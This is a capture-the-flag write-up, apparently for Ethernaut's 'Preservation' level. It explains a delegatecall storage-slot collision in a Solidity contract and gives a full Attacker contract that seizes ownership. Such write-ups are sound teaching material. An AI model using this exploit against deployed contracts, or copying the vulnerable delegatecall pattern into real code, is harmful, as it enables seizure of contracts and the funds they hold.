# 16. Preservation

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## Vulnerability

The issue here is that with delegate call, the delegated contract (LibraryContract) will execute using the storage context of its caller (Preservation).
When LibraryContract writes to its storage variable `storedTime` it will overwrite storage slot 0. But in the context of Preservation, this storage slot holds the variable `timeZone1Library`.

This allows us to overwrite the address of library1 very easily for the address of our choice, preferably the address of a contract that we control.
This attacking contract could then have a function `setTime(uint256)` and therefore allow delegated calls from Preservation with the objective of overwriting storage slot 2 which contains the owner variable.

The following contract solves the challenge, Metamask has some issues with gas estimation just make sure to call `attack()` with at least `43,663` gas.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // Storage slot 0
    address placeHolder1;
    // Storage slot 1
    address placeHolder2;
    // Storage slot 2
    address placeHolder3;
    // Storage slot 3
    uint256 placeHolder4;
    // Storage slot 5
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attack() public {
        // Use library 1 to overwirte its own address in Preservation contract by our contract address.
        (bool success,) = targetContract.call(abi.encodeWithSignature("setFirstTime(uint256)", this));
        require (success == true);

        // Make a second call, this one will be delegated to our contract which will overwrite the owner in storage slot2
        (success, ) = targetContract.call(abi.encodeWithSignature("setFirstTime(uint256)", 0));
        require (success == true);
    }

    function setTime(uint _time) public {
        placeHolder3 = tx.origin;
    }
}
```